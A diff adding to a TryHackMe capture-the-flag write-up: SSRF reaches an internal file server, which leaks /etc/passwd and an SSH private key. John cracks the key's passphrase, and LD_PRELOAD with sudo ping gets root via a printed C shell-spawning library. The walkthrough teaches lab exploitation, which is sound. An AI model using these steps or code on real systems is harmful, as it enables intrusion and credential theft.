@@ -83,7 +83,7 @@ One of the things that made me curious on this page is in the "About Us" section
 
 ![devcrud](./screenshots/recon3.png)
 
-This page when you enter it presents you a lot of articles about Node.js and especially some about the vulnerabilities that can be found in those types of apps, **this could be a huge hint for us**.
+This page when you enter it presents you a lot of articles about Node.js and especially some about the vulnerabilities that can be found in those types of apps, **this could be a huge hint for us.**
 
 ![articles](./screenshots/recon4.png)
 
@@ -152,3 +152,82 @@ This is the source code for the beta application and we see all the JS scripts a
 We need to firstly test the functionality and see how it interprets everything we seend by the form. I tried sending http://creative.thm and see what the website tells us. It just shows us the raw HTML page:
 
 ![test](./screenshots/recon7.png)
+
+I tried it on my IP and I see it just returns a listing of the directory I start the HTTP server so it's a good sign. I'll start by looking if there are any other ports open on that machine that we couldn't see prior to this. I've seen this works just reading files of my HTTP server so I can't send anything there that would be helpful to get us more information for this machine, maybe if we find an FTP or other port that could serve as some disclosure for us.
+
+We send the POST request to ffuf and **we see something interesting!**
+
+![ffuf](./screenshots/recon8.png)
+
+Port 1337 is open! Let's see how the server reacts when we send this request to the site.
+
+![rootfolder](./screenshots/recon9.png)
+
+We can see a directory listing for a root folder of the machine possibly. Let's see if we can find anything interesting here. We start by listing the /etc/passwd file:
+
+```
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin saad:x:1000:1000:saad:/home/saad:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash 
+```
+
+This is the results we get, we can see we have 2 users with home folders on this machine. Next we go to the home folders and see if there are any visible files that can get us some info to get us into the machine.
+
+![idrsa](./screenshots/recon10.png)
+
+In saad's home folder we can see in the .ssh folder we successfully get a **private key that can get us into the machine as saad!** We start by copying it into our machine, changing the perms of the file and trying to connect with it on port 22.
+
+![passphrase](./screenshots/recon11.png)
+
+When we try to connect it asks us for a passphrase, but it's not really a big deal. Maybe it's something weak that john can successfully crack easily.
+
+It doesn't really take a long time and **we get something back!**
+
+```
+john johnrsa --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+redacted        (idrsa)     
+1g 0:00:00:20 DONE (2025-07-28 15:08) 0.04899g/s 47.03p/s 47.03c/s 47.03C/s wesley..sandy
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+We use this passphrase and we're successfuly connected to the SSH! We start by getting the user.txt flag.
+
+![ssh](./screenshots/privesc1.png)
+
+I start by trying sudo -l and seeing if the password for his account is reused from the passphrase from SSH, but we're unsuccessful in that attempt. While looking more thoroughly through his home directory, I decide to read his .bash_history file, and what can we see, **saad stored his credentials in a .txt file and then removed them!**
+
+![creds.txt](./screenshots/privesc2.png)
+
+We successfully use sudo -l and we see that we can run the ping command as sudo. This isn't really a binary that can get us root, but, it will surely help us, because we have this as well!
+
+```
+env_keep+=LD_PRELOAD
+```
+
+We'll create a malicious .so file that spawns a shell, then preload it via LD_PRELOAD when running ping with sudo.
+
+I will use this root.c file to create the .so file that will hopefully get us root.
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setuid(0); setgid(0);
+    system("/bin/bash");
+}
+```
+
+We compile it on our machine, start a HTTP server with python in our directory and use wget to get the root.so file from our machine. Then we will use the sudo ping command in combination with the LD_PRELOAD=./root.so file and **we successfully get the root shell we were striving for!**
+
+![rootflag](./screenshots/privesc3.png)
+
+The privilege escalation part of the room was in my opinion considerably easier than the initial vulnerability that got us into the machine, but it was a really fun room. Big shout out to the creator of the room **ssaadakhtarr** and to TryHackMe for providing us these fun challenges.
+
